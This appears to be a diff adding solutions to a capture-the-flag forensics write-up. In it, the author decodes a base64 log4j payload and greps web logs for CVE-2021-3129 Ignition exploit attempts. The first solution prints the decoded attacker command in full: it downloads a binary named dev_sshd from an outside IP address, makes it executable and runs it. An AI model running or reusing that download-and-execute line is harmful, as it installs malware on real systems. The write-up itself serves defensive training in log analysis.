@@ -130,8 +130,15 @@ Flag format - byuctf{filename}
 ```
 
 #### Solution
+I took the obfuscated log4j attempt from above, and copied the base64 string from the filepath. I pasted it into <www.base64decode.com> and got the following ASCII decoding
+```
+wget http://158.101.118.236/dev_sshd; curl -O http://158.101.118.236/dev_sshd; chmod 777 dev_sshd; ./dev_sshd x86.exploit
+```
+
+This command downloads dev_sshd from the internet, enables it as an executable, and then runs it with the argument `x86.exploit`, which executes the x86.exploit file. So, our flag is byuctf{x86.exploit}
 
 #### Real World Application
+This problem involved decoding base64. Base64 is a commonly used encoding scheme so it's good to get familiar with it. A link to a base64 decoder is an essential for any security professional's bookmark folder, as anyone in the industry should be able to decode it quickly.
 
 ---
 
@@ -145,8 +152,20 @@ Flag format - byuctf{100.100.100.100_200.200.200.200}
 ```
 
 #### Solution
+First, we need to find out what CVE-2021-3129 is. <https://cve.mitre.org/> is a great site to look at Common Vulnerabilities and Exposures. Plugging 2021-3129 into the search bar gives us this information
+![cve](./cve.png)
+
+We see it uses Ignition, a platform for connecting data, to obtain RCE as an unauthenticated user. So, the obvious next step is `grep ignition access.log`.
+```
+45.146.165.37 - - [09/Feb/2022:10:00:56 +0000] "GET /_ignition/execute-solution HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+20.24.24.111 - - [09/Feb/2022:12:34:22 +0000] "GET /_ignition/execute-solution HTTP/1.1" 200 473 "-" "python-requests/2.27.1"
+20.24.24.111 - - [09/Feb/2022:12:34:22 +0000] "GET /_ignition/execute-solution HTTP/1.1" 200 473 "-" "python-requests/2.27.1"
+45.146.165.37 - - [09/Feb/2022:19:00:45 +0000] "GET /_ignition/execute-solution HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+```
+Voila! We have our two IPs.
 
 #### Real World Application
+This challenge provided the opportunity to use MITRE's CVE database to get more information about an attack. MITRE's knowledgebase is invaluable, so learning how to use it to gain more information about the specific ways hackers may be trying to break into a system allows defenders to quickly find exploit attempts.
 
 ---
 
